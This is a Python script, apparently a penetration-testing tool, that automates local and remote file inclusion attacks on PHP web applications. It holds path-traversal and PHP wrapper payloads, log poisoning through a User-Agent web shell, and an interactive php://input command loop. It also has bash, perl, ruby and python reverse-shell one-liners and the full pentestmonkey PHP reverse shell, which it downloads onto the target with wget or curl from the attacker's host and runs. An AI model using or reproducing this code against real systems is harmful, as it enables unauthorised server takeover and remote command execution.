#!/usr/bin/python3

import argparse
import signal
import sys
import requests
import subprocess
import time
import os

def double_encoding(args):

    double_encoded_lhost = ""
    for symbol in args.lhost:
        if symbol == "/":
            double_encoded_lhost += "%252f"
        else:
            double_encoded_lhost += symbol

    return double_encoded_lhost

def None_Check(args, arg):

    if getattr(args, arg) == None:
        return False
    return True

def wrapper_filter_payload_generator(args):

    rfi_linux_wrapper = ["php://filter/read=string.rot13/resource=index.php",
                         "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
                         "php://filter/convert.base64-encode/resource=index.php", "pHp://FilTer/convert.base64-encode/re"
                                                                                  "source=index.php"]
    if args.file != None:
        file = args.file
        for x in range(len(rfi_linux_wrapper)):
            rfi_linux_wrapper[x] = rfi_linux_wrapper[x].replace("index.php", file)
        return rfi_linux_wrapper
    return rfi_linux_wrapper

def get_reverse_shell(args, reverse_shells):

    shell = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

    if getattr(args, "shell_type") != None:
        shell_type = getattr(args, "shell_type").upper()
        shell_type += " REVERSE SHELL|"
        for shells in reverse_shells:
            if shell_type in shells:
                shell = shells
                shell = shell.replace(shell_type, "")
                shell = shell.replace("[IPADDR]", args.lhost)
                shell = shell.replace("[PORT]", args.lport)
                return shell
    shell = shell.replace("[IPADDR]", args.lhost)
    shell = shell.replace("[PORT]", args.lport)
    return shell

def test_lfi(args, reverse_shells, php_reverse_shell_pentest_monkeys):

    print("[+] Testing LFI ...")

    """ PAYLOADS """
    lfi_linux_basic = ["/../../../../../../etc/passwd"]
    lfi_linux_nullbyte = ["/../../../../../../etc/passwd%00"]
    lfi_linux_double_encoding = ["%252e%252e%252e%252e%252fetc%252fpasswd",
                                 "%252e%252e%252e%252e%252fetc%252fpasswd%00"]
    lfi_linux_utf8_encoding = ["%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
                               "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00"]
    lfi_linux_filter_bypass = ["/....//....//....//....//....//....//etc/passwd", "..///////..////..//////etc/passwd",
                               "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"]
    lfi_linux_filter_double = ["/..//..//..//..//..//..//etc/passwd"]
    lfi_linux_compression_wrapper = ["php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"]
    lfi_linux_wrapper = wrapper_filter_payload_generator(args)

    linux = [lfi_linux_basic, lfi_linux_nullbyte, lfi_linux_double_encoding, lfi_linux_utf8_encoding, lfi_linux_filter_bypass,
             lfi_linux_filter_double, lfi_linux_compression_wrapper, lfi_linux_wrapper]

    log_files = ["/var/log/apache/access.log", "/var/log/apache/error.log", "/var/log/apache2/access.log", "/var/log/apache2/error.log", "/var/log/nginx/access.log", "/var/log/nginx/error.log",
                 "/var/log/vsftpd.log", "/var/log/sshd.log", "/var/log/mail", "/var/log/httpd/error_log", "/usr/local/apache/log/error_log", "/usr/local/apache2/log/error_log"]
    headers = {'User-Agent' : "<?php system($_GET['cmd']);?>"}
    ext = "&ext"
    extension = False
    is_vulnerable = False
    working_payload = ""
    wants_reverse_shell = False
    found_log_files = False
    correct_log_file_path = ""
    downloader = ""

    for payload_type in linux:
        for payload in payload_type:
            request = requests.get(args.url + payload)
            request_ext = requests.get(args.url + payload + ext)
            if "root" in request_ext.text:
                extension = True
                is_vulnerable = True
                working_payload = payload
            elif "root" in request:
                is_vulnerable = True
                working_payload = payload
    if not is_vulnerable:
        return False
    else:
        print("[+] Target is vulnerable to LFI! Payload = " + working_payload)
    try:
        decision = str(input("[?] Want to try to establish reverse shell? (yes/no)"))
        if (decision.lower() == "yes") | (decision.lower() == "y"):
            wants_reverse_shell = True
    except Exception:
        print("[-] Error")
    if wants_reverse_shell:
        if (args.lport == None) or (args.lhost == None):
            print("[-] You have to specify a port [--lport <PORT>] and an IP [--lhost <LHOST>]")
            sys.exit()
        # Inject php code into log files
        inject_php = requests.get(args.url, headers=headers)
        inject_php
        for log_file in log_files:
            new_payload = working_payload.replace("/etc/passwd", log_file)
            if extension == True:
                new_payload += ext
            malicious_request = requests.get(url=args.url + new_payload + "&cmd=id")
            if "uid=" in malicious_request.text:
                print("[+] Log files found! Path: " + log_file)
                found_log_files = True
                break
        if not found_log_files:
            print("[-] Could not find/read log files! Continuing anyway ...")
        print("[+] Sending reverse shell ...")
        # if auto detect on ... last parameter auto_reverse_shell(reverse_shells) not get_reverse_shell(...)
        # First attempt to establish reverse shell
        malicious_request = requests.get(url=args.url + new_payload + "&cmd=" + get_reverse_shell(args, reverse_shells))
        malicious_request
        os.chdir("/tmp")
        # Second attempt to establish reverse shell, by trying another method
        with open("shell.php", "w", encoding="UTF-8") as shell_file:
            php_reverse_shell_pentest_monkeys = php_reverse_shell_pentest_monkeys.replace("[IPADDR]", args.lhost)
            php_reverse_shell_pentest_monkeys = php_reverse_shell_pentest_monkeys.replace("[PORT]", args.lport)
            shell_file.write(php_reverse_shell_pentest_monkeys)
            print("[-] Injecting reverse shell in to URL failed. Proceeding with other method ...")
            if True:
                # here is some problem
                os.chdir("/tmp")
                server = subprocess.Popen(['python3', '-m', 'http.server', '80'], stdout=subprocess.DEVNULL, preexec_fn=os.setsid, stderr=subprocess.STDOUT)
                # Testing if wget or curl is installed
                if "/usr/bin/wget" in requests.get(url=args.url + new_payload + "&cmd=which wget").text:
                    downloader = "wget"
                elif "/usr/bin/curl" in requests.get(url=args.url + new_payload + "&cmd=which curl").text:
                    downloader = "curl"
                else:
                    print("[-] Can not upload shell to server. Method failed")
                    return True
                if downloader == "wget":
                    params = {
                        "cmd" : "cd /tmp; wget http://" + args.lhost + "/shell.php; php shell.php"
                    }
                    wget_request = requests.get(url=args.url + new_payload, params=params)
                if downloader == "curl":
                    params = {
                        "cmd" : "cd /tmp; curl http://" + args.lhost + "/shell.php > shell.php; php shell.php"
                    }
                    curl_request = requests.get(url=args.url + new_payload, params=params)
                print("[-] Other method failed")
                os.killpg(os.getpgid(server.pid), signal.SIGTERM)
                # -----------------------------------------------------------------------------------------------------
                return True
            #except:
                #print("[-] Something went wrong with uploading the shell or setting up the server")
    else:
        print("[-] No reverse shell established. Continuing ...")
        return True
    return True

def test_rfi(args):

    if args.lhost == None:
        print("[-] Provide the IP of the machine the victim should connect to")
        sys.exit()
    if getattr(args, "remote_file") == None:
        print("[-] Provide the file on your machine you want the victim to open")
        sys.exit()
    time.sleep(3)
    print("[+] Testing RFI ...")

    """ PAYLOADS"""
    rfi_linux_basic = [str(args.lhost) + str(getattr(args, "remote_file")), str(args.lhost) + str(getattr(args, "remote_"
                    "file")) + "%00", double_encoding(args) + getattr(args, "remote_file")]

    linux = [rfi_linux_basic]

    for payload_type in linux:
        for payload in payload_type:
            url = args.url + payload
            request_get = requests.get(url)
            request_post = requests.post(url)

    print(("[+] Testing for RFI done ..."))

def wrapper(args):

    payload = "<?php echo shell_exec('id'); ?>"
    if args.payload != None:
        payload = args.payload
    if subprocess.call("which curl", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT) == 1:
        print("Install curl on your system (sudo apt-get install curl)")
        sys.exit()
    else:
        response = subprocess.call("curl -X POST --data " + "'" + payload + "' " + "'" + args.url + "/php://input%00" + "'" + " -k -v", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        if "uid=" in str(response):
            print("[+] You have command execution! Want to continue with custom commands? (yes/no)")
            try:
                var = str(input())
                var = var.upper()
                if (var == "YES") | (var == "Y") | (var == "YE"):
                    while True:
                        command = str(input("Command: "))
                        payload = """<?php echo shell_exec('""" + command + """'); ?>"""
                        response = subprocess.call("curl -X POST --data " + "'" + payload + "' " + "'" + args.url + "php://input%00" + "'" +
                            " -k -v", shell=True)
                        print(response)
                return True
            except:
                print("[-] Error")
        return False

if __name__ == "__main__":

    reverse_shells = ["""BASH REVERSE SHELL|bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1""",
                      """PERL REVERSE SHELL|perl -e 'use Socket;$i="[IPADDR]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",
                      """RUBY REVERSE SHELL|ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'""",
                      """PYTHON REVERSE SHELL|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
                      """PYTHON3 REVERSE SHELL|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
                      ]

    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("-u", "--url", action="store", required=False, help="Provide the full URL of the page, including the file you want to attack (ex: http://name/file.php?file=")
    parser.add_argument("--lhost", action="store", required=False, help="Provide a host URL for RFI or reverse shell")
    parser.add_argument("--lport", action="store", required=False, help="Provide a Port for reverse shell")
    parser.add_argument("--rfi", action="store_true", required=False, help="lfinc checks for RFI")
    parser.add_argument("-r", "--remote_file", action="store", required=False, help="The file to upload, when checking for RFI (Required if --rfi is enabled. Also serve the file directly out of the directory or provide the path")
    parser.add_argument("-f", "--file", action="store", required=False, help="Add a file which you know is in the same directory (default: index.php)")
    parser.add_argument("-p", "--payload", action="store", required=False, help="Specify a payload for wrapper (Default: <?php echo shell_exec('id'); ?>")
    parser.add_argument("-s", "--shell_type", action="store", required=False, help="Specify a reverse shell type (valid shells: python, python3, ruby, perl, bash) default: python3")
    args = parser.parse_args()

    check_url = None_Check(args, "url")
    check_lhost = None_Check(args, "lhost")
    check_lport = None_Check(args, "lport")
    check_file = None_Check(args, "file")
    check_payload = None_Check(args, "payload")
    check_rfi = args.rfi
    check_remote_file = None_Check(args, "remote_file")
    check_shell_type = None_Check(args, "shell_type")

    if not check_url:
        print("[-] Provide a full URL (ex: 10.10.10.10/index.php?file=) [-u/--url]")
        sys.exit()

    if check_lport & (not check_lhost):
        print("[-] Provide an IP address to talk back to [--lhost]")
        sys.exit()

    if check_rfi and not check_remote_file:
        print("[+] Provide the name of the file you want to upload")
        sys.exit()

    if check_remote_file and not check_rfi:
        print("[+] Turn on RFI flag, when providing a file from you machine [--rfi]")

    if "http" not in args.url:
        print("[+] Provide a valid URL format! (ex: http://website/get_file.php?file=)")
        sys.exit()

    shell_types = ["python", "python3", "ruby", "perl", "bash"]
    if check_shell_type:
        if str(getattr(args, "shell_type")).lower() not in shell_types:
            print("[-] Invalid shell type")
            sys.exit()

# Pentest monkeys php reverse shell https://github.com/pentestmonkey/php-reverse-shell.git
php_reverse_shell_pentest_monkeys = """
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '[IPADDR]';  // CHANGE THIS
$port = [PORT];       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

"""

if not test_lfi(args, reverse_shells, php_reverse_shell_pentest_monkeys):
    print("[-] Target not vulnerable to LFI")

if not wrapper(args):
    print("[-] Target not vulnerable to wrapper payloads")

if check_rfi:
    test_rfi(args)
